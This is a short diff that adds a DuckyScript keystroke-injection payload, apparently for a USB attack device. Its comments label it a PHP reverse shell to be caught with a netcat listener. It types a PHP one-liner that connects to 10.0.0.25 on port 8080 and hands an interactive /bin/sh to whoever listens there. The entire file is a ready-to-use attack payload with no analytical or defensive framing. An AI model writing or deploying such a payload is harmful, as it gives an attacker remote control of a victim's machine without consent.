@@ -1,0 +1,6 @@
+REM php based reverse shell
+REM works with: nc -lvp 8080
+REM change ip and port accordingly
+DELAY 1000
+STRING php -r '$ip="10.0.0.25";$port=8080;$sock=fsockopen($ip,$port);exec("/bin/sh -i <&3 >&3 2>&3");'
+ENTER
